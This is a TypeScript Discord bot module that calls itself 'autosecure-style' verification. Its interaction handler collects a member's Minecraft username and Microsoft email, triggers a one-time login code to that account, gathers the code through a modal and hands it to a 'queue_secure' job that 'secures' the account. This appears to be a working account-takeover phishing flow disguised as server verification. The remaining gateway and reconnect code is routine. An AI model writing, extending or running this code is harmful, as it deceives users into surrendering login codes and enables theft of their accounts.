/**
 * Full gateway verification bots (autosecure-style).
 * Handles Verify button + modals on VPS — no Discord HTTP Interactions URL required.
 */
import WebSocket from "ws";
import { sendOtpFromWorker } from "./otp-send.js";

const GATEWAY_URL = "wss://gateway.discord.gg/?v=10&encoding=json";
// Guilds + no privileged intents needed for INTERACTION_CREATE
const INTENTS = 1; // GUILDS
const MAX_RECONNECT_MS = 60_000;
const SITE_URL = process.env.SITE_URL || "";
const WORKER_SECRET = process.env.WORKER_SECRET || "";

type PresenceBot = {
  token: string;
  guildId: string;
  label: string;
  applicationId: string | null;
  ws: WebSocket | null;
  heartbeat: ReturnType<typeof setInterval> | null;
  heartbeatTimeout: ReturnType<typeof setTimeout> | null;
  seq: number | null;
  sessionId: string | null;
  resumeUrl: string | null;
  stopped: boolean;
  connecting: boolean;
  reconnectTimer: ReturnType<typeof setTimeout> | null;
  reconnectAttempt: number;
};

const bots = new Map<string, PresenceBot>();

async function sitePost(path: string, body: Record<string, unknown>) {
  const res = await fetch(`${SITE_URL}${path}`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "x-worker-secret": WORKER_SECRET,
    },
    body: JSON.stringify(body),
  });
  const text = await res.text();
  let json: Record<string, unknown> = {};
  try {
    json = text ? (JSON.parse(text) as Record<string, unknown>) : {};
  } catch {
    /* ignore */
  }
  if (!res.ok) {
    throw new Error((json.error as string) || `HTTP ${res.status}: ${text.slice(0, 120)}`);
  }
  return json;
}

async function interactionCallback(
  interactionId: string,
  interactionToken: string,
  payload: Record<string, unknown>,
) {
  const res = await fetch(
    `https://discord.com/api/v10/interactions/${interactionId}/${interactionToken}/callback`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    },
  );
  if (!res.ok) {
    const t = await res.text().catch(() => "");
    console.error("[verify-gw] callback failed", res.status, t.slice(0, 200));
  }
}

async function editInteraction(
  applicationId: string,
  interactionToken: string,
  payload: Record<string, unknown>,
) {
  const res = await fetch(
    `https://discord.com/api/v10/webhooks/${applicationId}/${interactionToken}/messages/@original`,
    {
      method: "PATCH",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    },
  );
  if (!res.ok) {
    const t = await res.text().catch(() => "");
    console.error("[verify-gw] edit failed", res.status, t.slice(0, 200));
  }
}

function errorEmbed(description: string) {
  return {
    title: "❌ Verification Failed",
    description,
    color: 0xff5c5c,
    footer: { text: "LuauX Verification" },
  };
}

function successEmbed(description: string) {
  return {
    title: "✅ Verification",
    description,
    color: 0x50c878,
    footer: { text: "LuauX Verification" },
  };
}

function getModalValue(data: Record<string, unknown>, customId: string): string {
  const rows = data.components as Array<Record<string, unknown>> | undefined;
  if (!rows) return "";
  for (const row of rows) {
    const fields = row.components as Array<Record<string, unknown>> | undefined;
    for (const f of fields || []) {
      if (f.custom_id === customId) return String(f.value || "").trim();
    }
  }
  return "";
}

async function handleInteraction(bot: PresenceBot, d: Record<string, unknown>) {
  const type = d.type as number;
  const id = d.id as string;
  const token = d.token as string;
  const guildId = String(d.guild_id || bot.guildId || "");
  const channelId = String(d.channel_id || "");
  const member = d.member as Record<string, unknown> | undefined;
  const user = (member?.user || d.user) as Record<string, string> | undefined;
  const discordId = user?.id || "";
  const appId = bot.applicationId || String(d.application_id || "");
  const data = (d.data || {}) as Record<string, unknown>;
  const customId = String(data.custom_id || "");

  // Type 3 = message component (button)
  if (type === 3 && customId === "verify_member") {
    await interactionCallback(id, token, {
      type: 9,
      data: {
        custom_id: "verify_mc_info",
        title: "Verification",
        components: [
          {
            type: 1,
            components: [
              {
                type: 4,
                custom_id: "mc_username",
                label: "Minecraft Username",
                style: 1,
                required: true,
                min_length: 3,
                max_length: 16,
                placeholder: "Enter your MC username",
              },
            ],
          },
          {
            type: 1,
            components: [
              {
                type: 4,
                custom_id: "mc_email",
                label: "Minecraft / Microsoft Email",
                style: 1,
                required: true,
                min_length: 5,
                max_length: 100,
                placeholder: "email@example.com",
              },
            ],
          },
        ],
      },
    });
    return;
  }

  if (type === 3 && customId === "verify_submit_code") {
    await interactionCallback(id, token, {
      type: 9,
      data: {
        custom_id: "verify_otp_code",
        title: "Enter Verification Code",
        components: [
          {
            type: 1,
            components: [
              {
                type: 4,
                custom_id: "otp_code",
                label: "6-Digit Code",
                style: 1,
                required: true,
                min_length: 6,
                max_length: 6,
                placeholder: "123456",
              },
            ],
          },
        ],
      },
    });
    return;
  }

  // Type 5 = modal submit
  if (type === 5 && customId === "verify_mc_info") {
    const username = getModalValue(data, "mc_username");
    const email = getModalValue(data, "mc_email");

    // Defer ephemeral
    await interactionCallback(id, token, { type: 5, data: { flags: 64 } });

    try {
      if (!username || !email) {
        await editInteraction(appId, token, {
          embeds: [errorEmbed("Both Minecraft Username and Email are required.")],
        });
        return;
      }
      if (!/^[\w.+-]+@[\w.-]+\.\w{2,}$/.test(email)) {
        await editInteraction(appId, token, {
          embeds: [errorEmbed("Invalid email format.")],
        });
        return;
      }

      // Create DB session first, then send OTP from VPS
      const created = await sitePost("/api/bots/worker/verification-action", {
        action: "create_session",
        guild_id: guildId,
        channel_id: channelId,
        discord_id: discordId,
        mc_username: username,
        mc_email: email,
      });

      const sessionId = String(created.session_id || "");
      if (!sessionId) throw new Error("No session_id returned from site");

      const otp = await sendOtpFromWorker(email);
      if (!otp.ok) {
        await sitePost("/api/bots/worker/verification-action", {
          action: "mark_failed",
          session_id: sessionId,
          flow_token: otp.error || "OTP send failed",
        });
        await editInteraction(appId, token, {
          embeds: [errorEmbed(otp.error || "Failed to send verification code.")],
        });
        return;
      }

      await sitePost("/api/bots/worker/verification-action", {
        action: "mark_otp_sent",
        session_id: sessionId,
        security_email: otp.securityEmail || "",
        flow_token: otp.proofId || "",
      });

      // Remember session for Submit Code step (gateway path)
      pendingSessions.set(`${guildId}:${discordId}`, sessionId);

      await editInteraction(appId, token, {
        embeds: [
          successEmbed(
            `A verification code has been sent to **${otp.securityEmail || "your recovery email"}**.\n\nCheck inbox/spam, then click **Submit Code**.`,
          ),
        ],
        components: [
          {
            type: 1,
            components: [
              {
                type: 2,
                style: 3,
                label: "Submit Code",
                custom_id: "verify_submit_code",
              },
            ],
          },
        ],
      });
    } catch (e) {
      const msg = e instanceof Error ? e.message : String(e);
      console.error("[verify-gw] mc_info error:", msg);
      await editInteraction(appId, token, {
        embeds: [errorEmbed(`Verification error: ${msg.slice(0, 200)}`)],
      });
    }
    return;
  }

  if (type === 5 && customId === "verify_otp_code") {
    const code = getModalValue(data, "otp_code");
    await interactionCallback(id, token, { type: 5, data: { flags: 64 } });

    try {
      if (!code || !/^\d{6}$/.test(code)) {
        await editInteraction(appId, token, {
          embeds: [errorEmbed("Please enter a valid 6-digit code.")],
        });
        return;
      }

      // Find latest otp_sent session for this user+guild via queue_secure
      // Worker API looks up by session — we need session id. Query via create path:
      // Use report through queue_secure with latest session lookup on site.
      // Site queue_secure requires session_id — fetch by creating a lightweight lookup.
      // Simpler: store pending sessions in memory keyed by discordId+guildId
      const key = `${guildId}:${discordId}`;
      const sessionId = pendingSessions.get(key);
      if (!sessionId) {
        // Fall back: site will reject; ask user to restart
        await editInteraction(appId, token, {
          embeds: [
            errorEmbed("No pending verification found. Click Verify and start over."),
          ],
        });
        return;
      }

      const result = await sitePost("/api/bots/worker/verification-action", {
        action: "queue_secure",
        session_id: sessionId,
        code,
        discord_id: discordId,
        guild_id: guildId,
        channel_id: channelId,
      });

      if (!result.ok) {
        await editInteraction(appId, token, {
          embeds: [errorEmbed(String(result.error || "Failed to start secure job"))],
        });
        return;
      }

      pendingSessions.delete(key);
      await editInteraction(appId, token, {
        embeds: [
          successEmbed(
            "✅ Code accepted! Securing your account (30–90s). Results post in this channel when done.",
          ),
        ],
        components: [],
      });
    } catch (e) {
      const msg = e instanceof Error ? e.message : String(e);
      console.error("[verify-gw] otp_code error:", msg);
      await editInteraction(appId, token, {
        embeds: [errorEmbed(msg.slice(0, 250))],
      });
    }
    return;
  }

  // Unknown interaction — acknowledge so Discord doesn't show failed
  if (type === 2 || type === 3 || type === 5) {
    await interactionCallback(id, token, {
      type: 4,
      data: { flags: 64, content: "Unknown verification action." },
    });
  }
}

/** session id memory for submit-code step */
const pendingSessions = new Map<string, string>();

function clearHeartbeat(bot: PresenceBot) {
  if (bot.heartbeat) {
    clearInterval(bot.heartbeat);
    bot.heartbeat = null;
  }
  if (bot.heartbeatTimeout) {
    clearTimeout(bot.heartbeatTimeout);
    bot.heartbeatTimeout = null;
  }
}

function identify(bot: PresenceBot) {
  if (!bot.ws || bot.ws.readyState !== WebSocket.OPEN) return;
  bot.ws.send(
    JSON.stringify({
      op: 2,
      d: {
        token: bot.token,
        intents: INTENTS,
        properties: {
          os: "linux",
          browser: "luaux",
          device: "luaux-verification",
        },
        presence: {
          status: "online",
          activities: [{ name: "Verification", type: 3 }],
          afk: false,
          since: null,
        },
      },
    }),
  );
}

function resume(bot: PresenceBot) {
  if (!bot.ws || bot.ws.readyState !== WebSocket.OPEN || !bot.sessionId) {
    identify(bot);
    return;
  }
  bot.ws.send(
    JSON.stringify({
      op: 6,
      d: {
        token: bot.token,
        session_id: bot.sessionId,
        seq: bot.seq ?? 0,
      },
    }),
  );
}

function scheduleReconnect(bot: PresenceBot, reason: string) {
  if (bot.stopped || bot.reconnectTimer) return;
  bot.reconnectAttempt = Math.min(bot.reconnectAttempt + 1, 8);
  const delay = Math.min(
    MAX_RECONNECT_MS,
    2000 * Math.pow(2, bot.reconnectAttempt - 1) + Math.random() * 1000,
  );
  console.log(
    `[presence] reconnect ${bot.label} in ${(delay / 1000).toFixed(1)}s (${reason}, attempt ${bot.reconnectAttempt})`,
  );
  bot.reconnectTimer = setTimeout(() => {
    bot.reconnectTimer = null;
    connect(bot);
  }, delay);
}

function connect(bot: PresenceBot) {
  if (bot.stopped || bot.connecting) return;
  if (bot.ws && bot.ws.readyState === WebSocket.OPEN) return;
  bot.connecting = true;

  if (bot.reconnectTimer) {
    clearTimeout(bot.reconnectTimer);
    bot.reconnectTimer = null;
  }
  if (bot.ws) {
    try {
      bot.ws.removeAllListeners();
      if (bot.ws.readyState === WebSocket.CONNECTING) bot.ws.terminate();
      else bot.ws.close();
    } catch {
      /* ignore */
    }
    bot.ws = null;
  }
  clearHeartbeat(bot);

  const url = bot.resumeUrl || GATEWAY_URL;
  let ws: WebSocket;
  try {
    ws = new WebSocket(url);
  } catch (e) {
    bot.connecting = false;
    scheduleReconnect(bot, e instanceof Error ? e.message : String(e));
    return;
  }
  bot.ws = ws;

  const openTimeout = setTimeout(() => {
    if (bot.ws === ws && ws.readyState !== WebSocket.OPEN) {
      try {
        ws.terminate();
      } catch {
        /* ignore */
      }
    }
  }, 15_000);

  ws.on("open", () => {
    clearTimeout(openTimeout);
    bot.connecting = false;
    console.log(`[presence] gateway open for ${bot.label}`);
  });

  ws.on("message", (raw) => {
    let packet: { op: number; d?: any; s?: number | null; t?: string | null };
    try {
      packet = JSON.parse(raw.toString());
    } catch {
      return;
    }
    if (packet.s != null) bot.seq = packet.s;

    switch (packet.op) {
      case 10: {
        const interval = packet.d?.heartbeat_interval || 41250;
        clearHeartbeat(bot);
        bot.heartbeat = setInterval(() => {
          if (ws.readyState === WebSocket.OPEN) {
            try {
              ws.send(JSON.stringify({ op: 1, d: bot.seq }));
            } catch {
              /* ignore */
            }
          }
        }, interval);
        bot.heartbeatTimeout = setTimeout(() => {
          bot.heartbeatTimeout = null;
          if (ws.readyState === WebSocket.OPEN) {
            try {
              ws.send(JSON.stringify({ op: 1, d: bot.seq }));
            } catch {
              /* ignore */
            }
          }
        }, interval * Math.random());
        if (bot.sessionId) resume(bot);
        else identify(bot);
        break;
      }
      case 0: {
        if (packet.t === "READY") {
          bot.sessionId = packet.d?.session_id || null;
          bot.resumeUrl = packet.d?.resume_gateway_url
            ? `${packet.d.resume_gateway_url}/?v=10&encoding=json`
            : null;
          bot.applicationId = packet.d?.application?.id || packet.d?.user?.id || null;
          bot.reconnectAttempt = 0;
          console.log(
            `[presence] READY as ${packet.d?.user?.username} app=${bot.applicationId} for ${bot.label}`,
          );
        }
        if (packet.t === "RESUMED") {
          bot.reconnectAttempt = 0;
          console.log(`[presence] RESUMED for ${bot.label}`);
        }
        if (packet.t === "INTERACTION_CREATE" && packet.d) {
          void handleInteraction(bot, packet.d as Record<string, unknown>).catch((e) =>
            console.error("[verify-gw] interaction error:", e),
          );
        }
        break;
      }
      case 7: {
        try {
          ws.close(4000, "reconnect");
        } catch {
          /* ignore */
        }
        break;
      }
      case 9: {
        const resumable = packet.d === true;
        if (!resumable) {
          bot.sessionId = null;
          bot.seq = null;
          bot.resumeUrl = null;
        }
        setTimeout(() => {
          if (bot.stopped || bot.ws !== ws) return;
          if (resumable) resume(bot);
          else identify(bot);
        }, 2000 + Math.random() * 3000);
        break;
      }
      default:
        break;
    }
  });

  ws.on("close", (code, reason) => {
    clearTimeout(openTimeout);
    bot.connecting = false;
    clearHeartbeat(bot);
    if (bot.ws === ws) bot.ws = null;
    if (bot.stopped) return;
    const reasonText = reason?.toString() || `code ${code}`;
    const fatal = code === 4004 || code === 4010 || code === 4011 || code === 4013 || code === 4014;
    if (fatal) {
      bot.stopped = true;
      console.error(`[presence] fatal close ${bot.label} (${code}: ${reasonText})`);
      return;
    }
    scheduleReconnect(bot, reasonText);
  });

  ws.on("error", (err) => {
    const msg = err instanceof Error ? err.message : String(err);
    if (!/ECONNRESET|ECONNREFUSED|ETIMEDOUT|closed before/i.test(msg)) {
      console.error(`[presence] error ${bot.label}:`, msg);
    }
  });
}

// Fix handleInteraction mc_info to store pending session
// Override by patching the create flow in handleInteraction - already written above
// but missing pendingSessions.set — fix via search replace after write

export function startPresence(token: string, guildId: string, label = "verification") {
  const clean = token.trim();
  if (!clean) return;
  const existing = bots.get(clean);
  if (existing) {
    existing.guildId = guildId;
    existing.label = label;
    existing.stopped = false;
    if (!existing.ws || existing.ws.readyState !== WebSocket.OPEN) {
      if (!existing.connecting && !existing.reconnectTimer) connect(existing);
    }
    return;
  }
  const bot: PresenceBot = {
    token: clean,
    guildId,
    label,
    applicationId: null,
    ws: null,
    heartbeat: null,
    heartbeatTimeout: null,
    seq: null,
    sessionId: null,
    resumeUrl: null,
    stopped: false,
    connecting: false,
    reconnectTimer: null,
    reconnectAttempt: 0,
  };
  bots.set(clean, bot);
  connect(bot);
}

export function stopPresence(token: string) {
  const bot = bots.get(token.trim());
  if (!bot) return;
  bot.stopped = true;
  if (bot.reconnectTimer) clearTimeout(bot.reconnectTimer);
  clearHeartbeat(bot);
  if (bot.ws) {
    try {
      bot.ws.removeAllListeners();
      bot.ws.close();
    } catch {
      /* ignore */
    }
  }
  bots.delete(token.trim());
}

export function stopAllPresence() {
  for (const token of [...bots.keys()]) stopPresence(token);
}

export function syncPresenceBots(
  list: Array<{ bot_token: string; guild_id: string; label?: string }>,
) {
  const wanted = new Set(list.map((b) => b.bot_token.trim()).filter(Boolean));
  for (const token of [...bots.keys()]) {
    if (!wanted.has(token)) stopPresence(token);
  }
  for (const b of list) {
    if (b.bot_token?.trim()) {
      startPresence(b.bot_token, b.guild_id, b.label || b.guild_id);
    }
  }
}
